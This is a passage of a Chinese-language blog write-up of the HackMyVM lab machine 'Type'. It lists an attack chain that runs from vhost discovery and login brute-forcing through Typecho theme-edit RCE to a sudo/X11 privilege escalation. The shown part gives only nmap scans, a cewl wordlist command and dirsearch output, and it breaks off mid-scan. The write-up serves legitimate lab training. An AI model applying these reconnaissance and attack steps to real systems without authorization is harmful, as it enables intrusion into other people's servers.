@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="back to the history and remember when I was born回眸歷史，记得我出生时何もない砂場飛び交う雷鳴在空无一物的沙地交错的雷鸣しょうもない音で掠れた生命於无谓的声音中乾涸的生命今後千年草も生えない 砂の惑星さ今后千百年间寸草不生的 沙漠星球  靶机ip:192.168.56.58 难度：中等 涉及内容： 信息搜集与边界突破：虚拟主机（Vhost）配置发现、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Type">
+<meta property="og:url" content="http://example.com/2026/04/24/HackMyVM-Type/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="back to the history and remember when I was born回眸歷史，记得我出生时何もない砂場飛び交う雷鳴在空无一物的沙地交错的雷鸣しょうもない音で掠れた生命於无谓的声音中乾涸的生命今後千年草も生えない 砂の惑星さ今后千百年间寸草不生的 沙漠星球  靶机ip:192.168.56.58 难度：中等 涉及内容： 信息搜集与边界突破：虚拟主机（Vhost）配置发现、">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_hg1QJGmlXu.png">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_bUfI6hdWPN.png">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_lX6e5QTjdw.png">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_0b71QxqWJQ.png">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_MN7EaTVcbU.png">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_sXvqAMsX4b.png">
+<meta property="og:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_09T2kkhkbn.png">
+<meta property="article:published_time" content="2026-04-24T02:24:28.000Z">
+<meta property="article:modified_time" content="2026-04-24T03:36:56.399Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="HVM">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/04/24/HackMyVM-Type/vmware_hg1QJGmlXu.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackMyVM-Type - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackMyVM-Type"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-24 10:24" pubdate>
+          April 24, 2026 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          21 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackMyVM-Type</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>back to the history and remember when I was born<br>回眸歷史，记得我出生时<br>何もない砂場飛び交う雷鳴<br>在空无一物的沙地交错的雷鸣<br>しょうもない音で掠れた生命<br>於无谓的声音中乾涸的生命<br>今後千年草も生えない 砂の惑星さ<br>今后千百年间寸草不生的 沙漠星球</p>
+<hr>
+<p>靶机ip:192.168.56.58</p>
+<p>难度：中等</p>
+<p>涉及内容：</p>
+<p><strong>信息搜集与边界突破</strong>：虚拟主机（Vhost）配置发现、<code>cewl</code> 定制字典生成、目录爆破、基于字典的后台登录爆破。</p>
+<p><strong>Web 安全漏洞利用</strong>：敏感信息泄露（草稿箱越权&#x2F;后台利用）、Typecho CMS 核心机制利用（主题文件编辑致 RCE）。</p>
+<p><strong>后渗透与横向移动</strong>：SQLite 数据库文件读取与提权、密码哈希破解（John the Ripper）、密码复用漏洞（Web 账户与系统账户同步）。</p>
+<p><strong>Linux 本地提权 (Root Privesc)</strong>：Sudo 环境变量配置不当 (<code>env_keep+=XAUTHORITY</code>)、X11 界面转发 (<code>ssh -X</code>) 与无头验证绕过、GUI 自动化交互工具 (<code>xdotool</code>) 利用、可写脚本劫持（配合 Sudo 触发执行）。</p>
+<hr>
+<p>端口扫描</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nmap -p- 192.168.56.58</span><br>Starting Nmap <span class="hljs-number">7.98</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2026</span><span class="hljs-number">-04</span><span class="hljs-number">-24</span> <span class="hljs-number">02</span>:<span class="hljs-number">29</span> +<span class="hljs-number">0000</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.58</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.58</span>)<br>Host is up (<span class="hljs-number">0.00057</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">1</span>F:<span class="hljs-number">43</span>:F2 (Oracle VirtualBox virtual NIC)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">4.34</span> <span class="hljs-built_in">seconds</span><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# <span class="hljs-keyword">nmap</span> -p22,<span class="hljs-number">80</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span> -sV -sC -T4 -A -O<br>Starting Nmap <span class="hljs-number">7.98</span> ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">24</span> <span class="hljs-number">02</span>:<span class="hljs-number">30</span> +<span class="hljs-number">0000</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span>)<br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.00086</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh     OpenSSH <span class="hljs-number">10.0</span> (protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    nginx<br>|_http-title: <span class="hljs-built_in">type</span>.dsz<br>|_http-generator: Typecho <span class="hljs-number">1.3</span>.<span class="hljs-number">0</span><br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">1</span>F:<span class="hljs-number">43</span>:F2 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may <span class="hljs-keyword">be</span> unreliable because we could not <span class="hljs-keyword">find</span> at least <span class="hljs-number">1</span> <span class="hljs-keyword">open</span> <span class="hljs-built_in">and</span> <span class="hljs-number">1</span> closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|router<br>Running: Linux <span class="hljs-number">4</span>.<span class="hljs-keyword">X</span>|<span class="hljs-number">5</span>.<span class="hljs-keyword">X</span>, MikroTik RouterOS <span class="hljs-number">7</span>.<span class="hljs-keyword">X</span><br>OS CPE: cpe:/<span class="hljs-keyword">o</span>:linux:linux_kerne<span class="hljs-variable">l:4</span> cpe:/<span class="hljs-keyword">o</span>:linux:linux_kerne<span class="hljs-variable">l:5</span> cpe:/<span class="hljs-keyword">o</span>:mikrotik:routero<span class="hljs-variable">s:7</span> cpe:/<span class="hljs-keyword">o</span>:linux:linux_kerne<span class="hljs-variable">l:5</span>.<span class="hljs-number">6.3</span><br>OS details: Linux <span class="hljs-number">4.15</span> - <span class="hljs-number">5.19</span>, OpenWrt <span class="hljs-number">21.02</span> (Linux <span class="hljs-number">5.4</span>), MikroTik RouterOS <span class="hljs-number">7.2</span> - <span class="hljs-number">7.5</span> (Linux <span class="hljs-number">5.6</span>.<span class="hljs-number">3</span>)<br>Network Distance: <span class="hljs-number">1</span> hop<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0.86</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span> (<span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span>)<br><br>OS <span class="hljs-built_in">and</span> Service detection performed. Please report any incorrect results at https://<span class="hljs-keyword">nmap</span>.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">8.02</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>将域名写入&#x2F;etc&#x2F;hosts</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.56.58</span> type.dsz<br></code></pre></td></tr></table></figure>
+
+<p>访问域名</p>
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_hg1QJGmlXu.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现两个用户，admin和sburro，同时点击admin的账户，又跳转到了一个域名devnotes.dsz</p>
+<p>再加进去</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.56.58</span> type.dsz devnotes.dsz<br></code></pre></td></tr></table></figure>
+
+<p>同时type.dsz下面提醒我们用cewl</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cewl</span> http://devnotes.dsz/ &gt; password.txt<br></code></pre></td></tr></table></figure>
+
+<p>目录扫描</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs gradle">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─# dirsearch -u http:<span class="hljs-comment">//devnotes.dsz/</span><br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages<span class="hljs-regexp">/dirsearch/</span>dirsearch.py:<span class="hljs-number">23</span>: UserWarning: pkg_resources is deprecated as an API. See https:<span class="hljs-comment">//setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br>  <span class="hljs-keyword">from</span> pkg_resources <span class="hljs-keyword">import</span> DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span>                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="hljs-number">25</span> | Wordlist <span class="hljs-keyword">size</span>: <span class="hljs-number">11460</span><br><br>Output <span class="hljs-keyword">File</span>: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>reports<span class="hljs-regexp">/http_devnotes.dsz/</span>__26-<span class="hljs-number">04</span>-<span class="hljs-number">24</span>_02-<span class="hljs-number">54</span>-<span class="hljs-number">16</span>.txt<br><br>Target: http:<span class="hljs-comment">//devnotes.dsz/</span><br><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">16</span>] Starting:                                                                                                                                       <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.ht_wsr.txt                                      <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess.bak1                                   <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess.orig                                   <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess.sample<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess.save<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess_extra<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess_orig<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccess_sc                                     <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccessBAK                                     <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccessOLD                                     <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htaccessOLD2<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htm                                             <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.html<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htpasswd_test                                   <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.htpasswds<br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">32</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /.httr-oauth                                      <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">54</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1000  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1000/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1001  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1001/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1991  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1991/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1995  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1995/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1994  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1994/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1993  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1993/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1992  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1992/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1990  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1990/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1997  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1997/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1996  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1996/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1999  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1999/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/1998  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/1998/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2000  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2000/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2001  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2001/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2005  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2005/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2003  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2003/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2004  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2004/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2009  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span 